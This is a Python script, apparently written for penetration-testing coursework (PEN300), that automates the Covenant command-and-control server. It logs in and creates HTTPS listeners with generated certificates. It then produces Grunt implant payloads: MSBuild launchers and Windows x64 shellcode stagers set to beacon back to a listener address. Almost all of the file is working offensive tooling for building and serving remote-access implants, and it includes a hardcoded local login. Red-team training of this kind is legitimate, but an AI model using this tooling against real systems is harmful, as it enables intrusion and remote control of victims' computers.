import os
import sys
import pdb
import time
import uuid
import base64
import random
import hashlib
from pathlib import Path
from functools import wraps

import requests
from OpenSSL import crypto
requests.packages.urllib3.disable_warnings()

if sys.version_info.major == 2:
    from urlparse import urlparse
else:
    from urllib.parse import urlparse

import cert

TAG = os.path.basename(__file__)

def log(fn):
    @wraps(fn)
    def wrap(*args, **kwargs):
        print('[+] %s: %s' % (TAG, fn.__name__))
        return fn(*args, **kwargs)
    return wrap

def Has(var):
    if isinstance(var, str):
        var = [var]
    def innerD(fn):
        @wraps(fn)
        def wrap(*args, **kwargs):
            for _ in var:
                if globals().get(_) is None:
                    print('Please initialize "%s" first!' % _)
                    exit(0)
            return fn(*args, **kwargs)
        return wrap
    return innerD

class BearerAuth(requests.auth.AuthBase):
    @Has('token')
    def __call__(self, r):
        r.headers["authorization"] = "Bearer " + token
        return r

endpoint = None
token = None
HOME = None

def init(url, home):
    global endpoint, HOME
    endpoint = url
    HOME = Path(home)

@Has('endpoint')
def isLocal():
    _ = urlparse(endpoint).netloc.split(':')[0]
    if _ == '127.0.0.1':
        return True
    return False

@log
@Has('endpoint')
def login(uname, passd):
    global token
    r = requests.post(endpoint + '/api/users/login', json=dict(userName=uname, password=passd), verify=False).json()
    assert r['success'], 'login failed'
    token = r['covenantToken']

@log
@Has('token')
def listeners():
    return requests.get(endpoint + '/api/listeners', auth=BearerAuth(), verify=False).json()

@log
@Has('token')
def launchers(Type=None):
    result = requests.get(endpoint + '/api/launchers', auth=BearerAuth(), verify=False).json()
    if Type is not None:
        return list(filter(lambda x: x['type'].lower() == Type.lower(), result))
    return result

@log
@Has('token')
def updateListener(info):
    assert 'id' in info
    r = requests.put(endpoint + '/api/listeners', json=info, auth=BearerAuth(), verify=False)
    assert r.status_code == 200

@log
@Has('token')
def delListener(listenerId):
    r = requests.delete(endpoint + '/api/listeners/%d' % listenerId, auth=BearerAuth(), verify=False)
    assert r.status_code == 200, r.status_code

@log
@Has(['token', 'HOME'])
def addListener(name, addr, port, bindaddr, bindport, ssl=True):
    info = dict(useSSL=ssl, profileId=2, listenerTypeId=1, status='active', bindAddress=bindaddr, bindPort=bindport,
        connectPort=port, connectAddresses=[addr], urls=['http%s://%s:%d' % ('s' if ssl else '', addr, port)], name=name)
    if ssl:
        _, _cert = cert.createCert()

        secret = str(uuid.uuid4())
        info['sslCertificate'] = cert.createPkcs12(secret, k=_, cert=_cert)
        info['sslCertificatePassword'] = secret
        info['sslCertHash'] = hashlib.sha1(crypto.dump_certificate(crypto.FILETYPE_ASN1, _cert)).hexdigest()

    res = requests.post(endpoint + '/api/listeners/http', json=info, auth=BearerAuth(), verify=False)
    if res.status_code != 200:
        print(res.status_code)
        print(res.text)
        exit(1)
    r = res.json()
    assert r['startTime'] is not None
    print('Listener GUID: %s' % r['guid'])
    return r['id']

@log
@Has('token')
def addLauncher(_type, listenerId, **info):
    _info = {
      "listenerId": listenerId,
      "implantTemplateId": 1, # GruntHTTP (1 in master, 3 in dev)
      "dotNetVersion": info.get('.net', "Net40"),
      "runtimeIdentifier": info.get('runtime', "win_x64"),
      "validateCert": False,
      "useCertPinning": True,
      "delay": 5,
      "jitterPercent": 10,
      "connectAttempts": 5,
      "compressStager": True
    }
    r = requests.post(endpoint + '/api/launchers/' + _type, json=_info, \
            auth=BearerAuth(), verify=False)
    assert r.status_code == 200, r.text
    _id = r.json()['id']
    _info['id'] = _id
    r = requests.put(endpoint + '/api/launchers/' + _type, json=_info, \
            auth=BearerAuth(), verify=False)
    assert r.status_code == 200, r.text
    return _id

@log
@Has('token')
def delLauncher(_id):
    assert requests.delete(endpoint + '/api/launchers/%d' % _id, auth=BearerAuth(), verify=False).status_code == 204

@Has(['endpoint', 'token'])
def listen(addr, port, bindaddr='0.0.0.0', bindport=443, name='O_O', ssl=False):
    # temp setting
    bindport = port
    for l in listeners():
        if l['bindAddress'] == bindaddr and l['bindPort'] == bindport:
            if addr in l['connectAddresses'] and port == l['connectPort']:
                #print('listener already exists, trying to update')
                l['name'] = name
                l['covenantToken'] = token
                updateListener(l)
                return l['id']
            delListener(l['id'])
    return addListener(name, addr, port, bindaddr, bindport, ssl=ssl)

@Has(['endpoint', 'token'])
def generateMsbuild(listenerId):
    info = {
        "listenerId": listenerId,
        "implantTemplateId": 1, # GruntHTTP (1 in master, 3 in dev)
        "dotNetVersion": 'Net40',
        "runtimeIdentifier": "win_x64",
        "validateCert": False,
        "useCertPinning": True,
        "delay": 5,
        "jitterPercent": 10,
        "connectAttempts": 5,
        "compressStager": True
    }
    r = requests.put(endpoint + '/api/launchers/msbuild', json=info, auth=BearerAuth(), verify=False)
    r = requests.post(endpoint + '/api/launchers/msbuild', json=r.json(), auth=BearerAuth(), verify=False)
    return r.json()['diskCode']

@Has(['endpoint', 'token', 'HOME'])
def generateShellcode(listenerId, purge=False, platform='x64'):
    if (HOME / 'Covenant/Data/Temp/GruntHTTP.exe').exists():
        (HOME / 'Covenant/Data/Temp/GruntHTTP.exe').unlink()
    if (HOME / 'Covenant/Data/Temp/GruntHTTP.bin').exists():
        (HOME / 'Covenant/Data/Temp/GruntHTTP.bin').unlink()
    if (HOME / 'Covenant/Data/Temp/GruntHTTP.bin.b64').exists():
        (HOME / 'Covenant/Data/Temp/GruntHTTP.bin.b64').unlink()

    # PUT -> POST -> file
    info = {
        "listenerId": listenerId,
        "implantTemplateId": 1, # GruntHTTP (1 in master, 3 in dev)
        "dotNetVersion": 'Net40',
        "runtimeIdentifier": "win_"+platform,
        "validateCert": False,
        "useCertPinning": True,
        "delay": 5,
        "jitterPercent": 10,
        "connectAttempts": 5,
        "compressStager": True
    }
    r = requests.put(endpoint + '/api/launchers/shellcode', json=info, auth=BearerAuth(), verify=False)
    r = requests.post(endpoint + '/api/launchers/shellcode', json=r.json(), auth=BearerAuth(), verify=False)
    with (HOME / 'Covenant/Data/Temp/GruntHTTP.bin').open('rb') as f:
        return f.read()

if __name__ == '__main__':
    ip = sys.argv[1]
    init('https://127.0.0.1:7443', '/Users/tree/Documents/chtsecurity/PEN300/scripts/Covenant/')
    login('tree', 'treetree')
    _id = listen(ip, 443, name='sumikko-%f' % random.random(), ssl=True)# crash when use https OTZ
    print('listenerId: %d' % _id)
    shellcode = generateShellcode(_id)
    assert len(shellcode) > 0
    print('Binary Location: %s/Covenant/Data/Temp/' % HOME)
    #shellcode = generateMsbuild(_id)
    #with open('GruntHTTP.xml', 'wb') as f:
    #    f.write(shellcode)
